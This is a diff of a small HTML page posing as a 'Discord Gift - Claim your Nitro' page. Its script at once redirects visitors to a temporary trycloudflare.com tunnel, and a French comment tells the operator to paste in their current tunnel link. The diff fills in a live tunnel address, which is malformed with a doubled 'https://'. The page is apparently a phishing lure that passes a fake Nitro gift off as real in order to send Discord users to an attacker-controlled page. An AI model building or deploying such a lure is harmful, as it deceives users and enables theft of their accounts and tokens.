@@ -7,10 +7,11 @@ index.html
     <title>Discord Gift - Claim your Nitro</title>
     <script>
         // REMPLACE LE LIEN CI-DESSOUS PAR TON LIEN CLOUDFLARE ACTUEL
-        window.location.replace("https://ton-lien-actuel.trycloudflare.com");
+        window.location.replace("https://https://trail-given-mistress-beam.trycloudflare.com");
     </script>
 </head>
 <body style="background-color: #36393f; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
     <p>Chargement du cadeau Nitro...</p>
 </body>
+
 </html>
